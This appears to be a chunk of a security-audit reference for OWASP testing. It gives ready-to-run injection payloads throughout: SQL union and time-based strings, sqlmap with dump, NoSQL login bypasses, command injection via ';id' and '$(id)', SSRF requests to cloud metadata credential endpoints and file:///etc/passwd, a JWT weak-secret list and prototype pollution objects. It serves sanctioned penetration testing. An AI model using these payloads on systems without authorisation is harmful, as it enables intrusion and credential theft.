# Injection Testing (OWASP A03) — SQL, NoSQL, Command

Source: core-04-SECURITY_AUDITOR.md (chunked 2026-07-03). Live-test scripts for injection classes — use when the audit scope includes exploitability verification, not just static pattern matching.

---

## OWASP A01/A02/A03 Quick Reference

| # | Category | CVSS Base | Key Tests |
|---|----------|-----------|-----------|
| A01 Broken Access Control | Critical (9.0-10.0) | IDOR, vertical/horizontal privilege escalation, forced browsing, JWT role manipulation |
| A02 Cryptographic Failures | High (7.0-8.9) | TLS version/cipher, hardcoded secrets, weak hashing (MD5/SHA1/low bcrypt rounds) |
| A03 Injection | Critical (9.0-10.0) | SQL, NoSQL, command injection |

### A01: IDOR / Privilege Escalation test pattern
```bash
# Horizontal: User A's token against User B's resource
curl -X GET "https://api.example.com/users/user-b-id/profile" -H "Authorization: Bearer $USER_A_TOKEN"
# Expected: 403. Vulnerable: 200 with User B's data = CRITICAL (CVSS ~9.1)

# Vertical: regular user token against admin endpoint
curl -X DELETE "https://api.example.com/admin/users/user-id" -H "Authorization: Bearer $USER_TOKEN"
# Expected: 403. Vulnerable: 200 = CRITICAL (CVSS ~9.8)
```
Forced browsing: sweep common paths (`/admin`, `/api/internal`, `/.env`, `/config`) unauthenticated — any 200 = HIGH.

JWT role manipulation: decode → flip `role` → attempt to re-sign with a weak-secret wordlist (`secret`, `password`, `admin`, `test`, `qwerty`, `jwt_secret`, `your-256-bit-secret`, `change-me`) — any match is CRITICAL and means the whole token scheme is broken.

### A02: TLS & hashing checks
```bash
./testssl.sh --full https://api.example.com
nmap --script ssl-enum-ciphers -p 443 api.example.com
curl -v --tlsv1.0 --tls-max 1.0 https://api.example.com   # expect handshake failure
```
Password hash fingerprinting from hash length/prefix: 32 hex chars = MD5 (CVSS 8.1), 40 hex chars = SHA-1 (CVSS 7.4), no `$2a$`/`$2b$` prefix = not bcrypt, bcrypt rounds < 10 = weak (CVSS 5.3).

Hardcoded secret regexes: `password\s*=\s*["\']`, `api[_-]?key\s*=\s*["\']`, `AKIA[0-9A-Z]{16}` (AWS), `-----BEGIN PRIVATE KEY-----`.

## SQL Injection

### Automated (sqlmap)
```bash
sqlmap -u "https://api.example.com/users?id=1" --batch --level=5 --risk=3 --random-agent
sqlmap -u "https://api.example.com/search" --data="query=test&category=all" --method=POST --batch
sqlmap -u "https://api.example.com/api/users" --header="Authorization: Bearer eyJ..." --batch --dump
```

### Manual payload classes
- Error-based: `'`, `"`, `' OR '1'='1'--`
- Union-based: `' UNION SELECT NULL,NULL,NULL--`, `' UNION SELECT username,password FROM users--`
- Boolean-based: `' AND '1'='1`, `' AND '1'='2`
- Time-based blind: `'; WAITFOR DELAY '00:00:05'--` (MSSQL), `' OR SLEEP(5)--` (MySQL), `' OR pg_sleep(5)--` (Postgres)

Detection signal for error-based: response body contains `SQL syntax`, `mysql_fetch`, `pg_query`, `ORA-`, `ODBC`, `SQLite`, `Unclosed quotation mark`. Time-based: measure actual response latency against the injected delay.

## NoSQL Injection (MongoDB)

```javascript
// Auth bypass via operator injection
{ "email": {"$ne": null}, "password": {"$ne": null} }
{ "email": "admin@example.com", "password": {"$gt": ""} }
{ "email": {"$regex": ".*admin.*"}, "password": {"$ne": null} }
{ "$where": "1==1" }
```
Test: POST each payload to the login endpoint; a 200 with a token/user object returned = CRITICAL (CVSS 9.8). `$where` injection is the most dangerous — it evaluates arbitrary JS server-side.

## Command Injection

```bash
curl "https://api.example.com/ping?host=8.8.8.8;id"
curl "https://api.example.com/ping?host=8.8.8.8|id"
curl "https://api.example.com/ping?host=\$(id)"
```
Blind variant: time-based payloads (`; sleep 5`, `| sleep 5`, `` `sleep 5` ``, `$(sleep 5)`, `%0asleep 5`) — a ≥5s response delay confirms execution even with no output channel. CVSS 10.0 (full RCE) when confirmed.

## SSRF (OWASP A10, often chained with injection findings)

Internal service discovery targets: `localhost:6379` (Redis), `:5432` (Postgres), `:27017` (MongoDB), `:9200` (Elasticsearch), private ranges `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`.

Cloud metadata exploitation (CRITICAL, CVSS 9.8 — often yields IAM credentials):
```
AWS:   http://169.254.169.254/latest/meta-data/iam/security-credentials/
GCP:   http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
Azure: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=...
```
Protocol smuggling: `file:///etc/passwd`, `gopher://localhost:6379/_INFO`, `dict://localhost:6379/INFO` — tests whether the URL-fetch feature restricts schemes to http/https.

## Prototype Pollution & Insecure Deserialization (OWASP A08)

```javascript
{"__proto__":{"isAdmin":true}}
{"constructor":{"prototype":{"isAdmin":true}}}
```
Send payload, then probe a downstream endpoint for the polluted flag (`isAdmin`, `polluted`) reflecting back — confirms prototype pollution (CVSS 8.1). Remediation: reject `__proto__`/`constructor`/`prototype` keys in any recursive merge, use `Object.create(null)` for pure data maps, `Object.freeze()` config objects.
